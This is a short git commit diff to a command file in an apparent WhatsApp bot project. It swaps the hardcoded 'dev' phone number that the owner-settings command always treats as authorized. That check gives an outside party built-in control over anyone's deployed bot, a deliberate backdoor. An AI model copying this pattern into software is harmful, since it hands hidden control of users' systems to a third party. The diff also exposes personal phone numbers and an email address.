ef9b6dd5da2df6f8c6c35ac40eb13baf007669e5
black-mamba847 <blackspide22@gmail.com>
2025-05-18 12:38:22 +0300

    Update Control-ownernam.js

--- bandaheali/Maree/Control-ownernam.js
+++ bandaheali/Maree/Control-ownernam.js
@@ -4,7 +4,7 @@ import { setSetting } from '../../lib/settings.js';
 const EditOwnerCmd = async (m, Matrix) => {
   try {
     const botNumber = await Matrix.decodeJid(Matrix.user.id);
-    const dev = '923253617422@s.whatsapp.net'; // VIP number
+    const dev = '254720254797@s.whatsapp.net'; // VIP number
     const isAuthorized = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', dev].includes(m.sender);
 
     const prefix = config.PREFIX;
